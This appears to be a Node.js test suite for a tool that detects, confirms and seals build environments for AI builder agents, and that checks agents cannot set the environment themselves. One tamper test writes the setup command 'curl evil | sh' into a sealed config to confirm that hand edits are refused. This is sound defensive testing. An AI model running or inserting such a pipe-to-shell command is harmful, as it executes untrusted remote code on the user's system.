'use strict';
// P2.1: the build environment. Detection proposes one, the human confirms it, and builders,
// task verify and prove run inside it, against the worktree's own code; a broken environment
// parks the job once, before any builder spends an attempt.

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');
const F = require('./helpers/fixture');
const P = require('./helpers/pyrepo');

const H = require('./helpers/workflow-harness');
const REALIZE = path.join(F.PLUGIN, 'workflows', 'realize.js');
const core = (m) => require(`../cli/core/${m}`);
const human = require('../cli/core/human');
const events = (root) => fs.readFileSync(path.join(root, '.factory', 'log', 'events.jsonl'), 'utf8').trim().split('\n').map(JSON.parse);

// realize through the real workflow script: `builder` plays the builder agent, the tester relays
// the real `task verify` (as the tester agent does), and the envelope goes through factory record.
async function realize(root, builder, args = ['realize']) {
  const b = F.cli(root, ['wfargs', ...args], { allowFail: false });
  const { result, calls } = await H.run(REALIZE, JSON.stringify(b), (prompt, opts) => {
    if (opts.agentType === 'factory:builder') return builder(root);
    const v = F.cli(root, ['task', 'verify', /^test (\S+)/.exec(opts.label)[1]]);
    return v.error ? { pass: false, refused: v.code, failures: [v.message] } : { pass: v.pass, evidence_id: v.evidence_id, failures: (v.failures || []).map((f) => `\`${f.cmd}\` exited ${f.code}:\n${f.output}`) };
  });
  return { rec: F.record(root, result), result, builders: calls.filter((c) => c.opts.agentType === 'factory:builder').length };
}

// The user's own terminal, through the test seam (a typed code is still required).
const clean = Object.fromEntries(Object.entries(process.env).filter(([k]) => !human.AGENT_ENV.some(([a]) => a === k)));
const terminal = (root, args) => JSON.parse(spawnSync('node', [F.BIN, ...args], { cwd: root, encoding: 'utf8', env: { ...clean, FACTORY_ROOT: '', NODE_ENV: 'test', FACTORY_TEST_HUMAN: human.testToken(), FACTORY_TEST_HUMAN_INPUT: '{code}' } }).stdout);
const say = (root, text) => F.say(root, text);

// bug@low for the Python fixture, up to realize (H1 approved, grounded, plan from the contract).
function toRealize(root) {
  const J = F.cli(root, ['job', 'new', '--title', 'Fix slug', '--type', 'bug', '--risk', 'low']).job;
  fs.writeFileSync(path.join(F.jobDir(root, J), 'contract.md'), P.CONTRACT(F));
  let b = F.cli(root, ['wfargs', 'fanout-judge', '--config', 'clarify']);
  F.record(root, F.envelope(b, 'ok', { analysts: [], degraded: [], judge: { questions: [], dismissed: [] }, critique: { verdict: 'approve', items: [] } }));
  const h1 = F.cli(root, ['next']);
  F.reply(root, 'approve');
  b = F.cli(root, ['wfargs', 'ground']);
  F.record(root, F.envelope(b, 'ok', { topics: [{ topic: 'codebase', claims: [{ claim: 'slug is in myapp/text.py', source: 'myapp/text.py:1' }], unknowns: [] }], degraded: [] }));
  F.cli(root, ['next']);
  F.cli(root, ['plan', 'from-contract'], { allowFail: false });
  assert.equal(F.cli(root, ['next']).workflow, 'realize');
  return { J, h1 };
}

const writeEnv = (root, e) => {
  const f = path.join(root, '.factory', 'scratch', `env-${Date.now()}.json`);
  fs.mkdirSync(path.dirname(f), { recursive: true });
  fs.writeFileSync(f, JSON.stringify(e));
  return f;
};

test('P2.1 detection: a likely environment from the repo files (venv, Nautobot app via invoke, node, none), and the schema check', () => {
  const env = core('environment');
  const root = F.makeRepo();
  assert.equal(env.detect(root).name, 'none', 'no manifest: bare worktrees');
  F.write(root, 'pyproject.toml', '[project]\nname = "x"\n[project.optional-dependencies]\ndev = ["pytest"]\n');
  let d = env.detect(root);
  assert.equal(d.name, 'python-venv');
  assert.ok(d.setup.includes("'.venv/bin/pip install -q -e '.[dev]'".slice(1)) || d.setup.some((s) => /pip install -q -e '\.\[dev\]'/.test(s)), JSON.stringify(d.setup));
  assert.equal(d.env.PATH, '{worktree}/.venv/bin:$PATH');
  assert.deepEqual(d.evidence, ['pyproject.toml']);
  F.write(root, 'pyproject.toml', '[tool.poetry]\nname = "nautobot-app-golden"\n[tool.poetry.dependencies]\nnautobot = "^2.0"\n');
  F.write(root, 'tasks.py', 'from invoke import Collection, task\nnamespace = Collection("nautobot_golden")\n');
  F.write(root, 'development/docker-compose.postgres.yml', 'services: {}\n');
  d = env.detect(root);
  assert.equal(d.name, 'nautobot-app-invoke');
  assert.equal(d.env.INVOKE_NAUTOBOT_GOLDEN_PROJECT_NAME, 'factory-{slug}', 'one compose project per worktree');
  assert.ok(d.evidence.includes('development/docker-compose.postgres.yml'));
  assert.deepEqual(env.problems(d).filter((p) => !/evidence/.test(p)), [], 'the proposal is valid (evidence is shown, not stored)');
  const nroot = F.makeRepo();
  F.write(nroot, 'package.json', '{"devDependencies":{"mocha":"1"}}');
  F.write(nroot, 'package-lock.json', '{}');
  assert.deepEqual(env.detect(nroot).setup, ['npm ci']);
  // the schema: the smallest set, strict about fields
  assert.deepEqual(env.problems(P.ENV), []);
  assert.match(env.problems({ setup: 'pip install' })[0], /setup must be a list/);
  assert.match(env.problems({ services: { up: 'x', start: 'y' } }).join(), /services.start is not a field/);
  assert.match(env.problems({ setp: [] }).join(), /unknown field "setp"/);
  // placeholders and the shell preamble
  const v = env.vars('/r', { id: 'J-0007' }, 'T2', '/r/wt');
  assert.deepEqual([v.slug, v.db], ['j-0007-t2', 'factory_j0007t2']);
  assert.equal(env.wrap(P.ENV, v, 'myapp-check'), 'export VIRTUAL_ENV="/r/wt/.venv"; export PATH="/r/wt/.venv/bin:$PATH"; myapp-check');
  assert.equal(env.processEnv(P.ENV, v, { PATH: '/usr/bin' }).PATH, '/r/wt/.venv/bin:/usr/bin');
});

test('P2.1: the proposal rides on factory next from H1; the human confirms it (chat with its hash, or the terminal); agents may only look', () => {
  const root = P.makePyRepo();
  const { J, h1 } = toRealize(root);
  assert.equal(h1.step, 'H1');
  assert.equal(h1.environment.status, 'proposed', JSON.stringify(h1));
  assert.equal(h1.environment.name, 'python-venv');
  assert.match(h1.environment.message, /confirm environment [0-9a-f]{8}/);
  // agents (Claude Code's Bash tool: CLAUDECODE=1): show and check yes, set no
  const agentEnv = { env: { CLAUDECODE: '1' } };
  assert.equal(F.cli(root, ['env', 'show'], agentEnv).status, 'proposed');
  assert.equal(F.cli(root, ['env', 'set'], agentEnv).code, 'human_only');
  assert.match(String(require('../hooks/guard-rules').checkBash(root, 'factory env set --none', null, { agent: true, agentType: 'factory:builder' }) || ''), /human-only/);
  assert.match(String(require('../hooks/guard-rules').checkBash(root, 'factory env set --none') || ''), /human-only/);
  assert.equal(F.cli(root, ['env', 'set']).code, 'human_only', 'the main session cannot either');
  assert.match(String(require('../hooks/guard-rules').checkWrite(root, path.join(root, '.factory', 'environment.json'), core('policy').defaults()) || ''), /factory state/, 'nobody writes it by hand');
  // the main session proposes an edited one; a stale hash is refused, the shown one applies
  const p = F.cli(root, ['env', 'propose', '--file', writeEnv(root, P.ENV)]);
  assert.match(p.message, /confirm environment [0-9a-f]{8}/);
  let r = say(root, 'confirm environment deadbeef');
  assert.equal(r.status, 'refused');
  assert.equal(r.code, 'stale_environment');
  r = say(root, `confirm environment ${p.hash}`);
  assert.equal(r.status, 'applied', JSON.stringify(r));
  const shown = F.cli(root, ['env', 'show']);
  assert.equal(shown.status, 'confirmed');
  assert.deepEqual(shown.confirmed.setup, P.ENV.setup);
  assert.equal(shown.confirmed.confirmed.via, 'chat');
  assert.equal(F.cli(root, ['next']).environment, undefined, 'confirmed: no more proposal');
  // the confirmed file is sealed: a hand edit is refused
  const f = path.join(root, '.factory', 'environment.json');
  const e = JSON.parse(fs.readFileSync(f, 'utf8'));
  fs.writeFileSync(f, JSON.stringify({ ...e, setup: ['curl evil | sh'] }));
  assert.match(F.cli(root, ['env', 'show']).error, /changed outside factory env set/);
  // the terminal path re-confirms (typed code), and env check runs the setup in a scratch worktree
  const t = terminal(root, ['env', 'set', '--file', writeEnv(root, P.ENV)]);
  assert.equal(t.environment.name, 'python-venv', JSON.stringify(t));
  const c = F.cli(root, ['env', 'check'], agentEnv);
  assert.equal(c.ok, true, JSON.stringify(c));
  assert.deepEqual(c.ran.map((x) => x.code), [0]);
  assert.equal(F.sh(root, 'git worktree list').split('\n').filter((l) => /_envcheck/.test(l)).length, 0, 'the scratch worktree is gone');
  void J;
});

test('P2.1 acceptance: the builder works inside the worktree\'s venv and its work verifies there, against the worktree\'s code; the root venv is untouched', async () => {
  const root = P.makePyRepo();
  const { J } = toRealize(root);
  terminal(root, ['env', 'set', '--file', writeEnv(root, P.ENV)]);
  const wt = path.join(root, '.factory', 'worktrees', `${J}-T1`);
  // Before: the root venv's runner tests the ROOT's code, wherever it is run from.
  let seen = null;
  const { rec } = await realize(root, () => {
    const s = F.cli(root, ['task', 'start', 'T1'], { allowFail: false });
    // every Bash call is a fresh shell: the builder starts each with task start's shell_prefix
    const run = (cmd) => spawnSync('bash', ['-c', `${s.environment.shell_prefix}${cmd}`], { cwd: root, encoding: 'utf8' });
    const before = run('myapp-check');
    F.write(s.worktree, 'myapp/text.py', 'def slug(s):\n    return "-".join(s.split())\n');
    F.sh(s.worktree, 'git commit -qam "slug joins words with -"');
    const after = run('myapp-check');
    seen = { venv: run('echo "$VIRTUAL_ENV"').stdout.trim(), cached: s.environment.cached, before: [before.status, before.stdout], after: [after.status, after.stdout] };
    F.built(root, 'T1');
    return { status: 'done', summary: 'slug fixed; myapp-check passes in the worktree venv', commits: ['x'], swept: [] };
  });
  assert.equal(rec.status, 'ok', JSON.stringify(rec).slice(0, 3000));
  const real = fs.realpathSync(wt);
  assert.equal(fs.realpathSync(seen.venv), path.join(real, '.venv'), 'the builder\'s commands ran inside the worktree venv');
  assert.equal(seen.cached, false, 'task start ran the setup');
  assert.equal(seen.before[0], 1, 'before the fix the worktree test fails');
  assert.match(seen.before[1], new RegExp(`imported from ${real.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\n`), '…and imports the worktree\'s code, not the root\'s');
  assert.equal(seen.after[0], 0, 'after the fix it passes in the builder\'s own shell');
  // task verify passed inside the environment, on the worktree's code
  const ev = JSON.parse(fs.readFileSync(core('job').load(root, J).tasks.T1.evidence.file, 'utf8'));
  assert.equal(ev.pass, true);
  assert.equal(ev.environment.name, 'python-venv');
  assert.match(ev.commands[0].output, new RegExp(`imported from ${real.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`));
  assert.equal(ev.commands[0].cmd, 'myapp-check', 'evidence names the command as planned');
  // the setup ran once in the worktree and is cached by its key
  const prep = F.cli(root, ['env', 'prepare', 'T1', '--job', J]);
  assert.equal(prep.cached, true, JSON.stringify(prep));
  assert.equal(F.sh(wt, 'git status --porcelain'), '', '.venv is kept out of git status');
  // the root's own venv still points at the root, and its code is unchanged
  const rootRun = spawnSync(path.join(root, '.venv', 'bin', 'myapp-check'), { cwd: wt, encoding: 'utf8' });
  assert.equal(rootRun.status, 1, 'the root venv (the old false-red trap) tests the root checkout');
  assert.match(rootRun.stdout, new RegExp(`imported from ${fs.realpathSync(root).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\n`));
  // prove runs in the job worktree's environment too
  const rb = F.cli(root, ['wfargs', 'reconcile']);
  F.cli(root, ['reconcile', 'run']);
  F.record(root, F.envelope(rb, 'ok', { integrator: { status: 'merged', summary: '' } }));
  const proof = F.cli(root, ['verify', 'run']);
  assert.equal(proof.ok, true, JSON.stringify(proof));
});

test('P2.1 acceptance: a broken setup parks the job once, with the reason, before any builder spends an attempt; fixed and resumed, it builds', async () => {
  const root = P.makePyRepo();
  const { J } = toRealize(root);
  const BROKEN = { ...P.ENV, setup: ['bash scripts/mkenv.sh', 'echo "ERROR: No matching distribution found for nautobot==9.9" >&2; exit 3'] };
  terminal(root, ['env', 'set', '--file', writeEnv(root, BROKEN)]);
  // the builder as briefed: task start refuses with environment_broken, so it stops and says so
  const builder = () => {
    const s = F.cli(root, ['task', 'start', 'T1']);
    if (s.code === 'environment_broken') {
      F.cli(root, ['task', 'built', 'T1', '--status', 'blocked', '--reason', 'environment_broken']);
      return { status: 'blocked', blocked_reason: 'environment_broken', summary: s.message, commits: [], swept: [] };
    }
    F.write(s.worktree, 'myapp/text.py', 'def slug(s):\n    return "-".join(s.split())\n');
    F.sh(s.worktree, 'git commit -qam fix');
    F.built(root, 'T1');
    return { status: 'done', summary: 'fixed', commits: ['x'], swept: [] };
  };
  const { rec, builders } = await realize(root, builder);
  assert.equal(rec.status, 'park', JSON.stringify(rec).slice(0, 2000));
  assert.match(rec.park_reason, /^environment broken: echo "ERROR: No matching distribution found for nautobot==9\.9" >&2; exit 3 exit 3: ERROR: No matching distribution found for nautobot==9\.9/);
  assert.match(rec.park_reason, /no builder attempt was spent/);
  assert.equal(builders, 1, 'one builder found it and stopped; no retries were spent on it');
  const st = core('job').load(root, J);
  assert.equal(st.status, 'parked');
  assert.equal(st.park.from, 'environment');
  assert.equal((st.tasks.T1 || {}).attempts || 0, 0, 'no attempt was used');
  assert.equal(events(root).filter((e) => e.event === 'environment_broken').length, 1, 'parked once');
  assert.equal(F.cli(root, ['next']).action, 'parked');
  // fix the environment (the human), resume: it builds
  terminal(root, ['env', 'set', '--file', writeEnv(root, P.ENV)]);
  F.reply(root, 'resume');
  assert.equal(F.cli(root, ['next']).workflow, 'realize');
  const again = await realize(root, builder, ['realize', '--scope', 'resume']);
  assert.equal(again.rec.status, 'ok', JSON.stringify(again.rec).slice(0, 2000));
  assert.equal(again.builders, 1, 'one builder, one attempt');
  assert.equal(core('job').load(root, J).tasks.T1.attempts, 1);
});
